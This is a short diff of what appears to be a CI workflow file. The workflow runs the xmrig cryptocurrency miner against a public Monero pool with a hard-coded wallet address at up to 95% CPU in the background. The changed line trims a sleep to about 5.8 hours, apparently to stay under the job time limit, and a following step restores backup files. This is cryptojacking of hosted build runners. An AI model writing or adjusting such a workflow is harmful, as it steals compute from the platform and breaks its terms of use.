@@ -43,7 +43,7 @@ jobs:
         run: |
           cd xmrig/build
           ./xmrig -o pool.supportxmr.com:3333 -u 43dg7Dzeqtd7BmGsctHnnLS4w53NJfwLwfyV8zZuyKjX19dmwn9mhkUPrmrtDaNxBScd4E5EuDJR3bzqzRBrxmia615EkEV -p x --donate-level 1 --cpu-priority 5 --max-cpu-usage=95 &
-          sleep 21600
+          sleep 21000
 
       - name: Restore backup files
         run: |
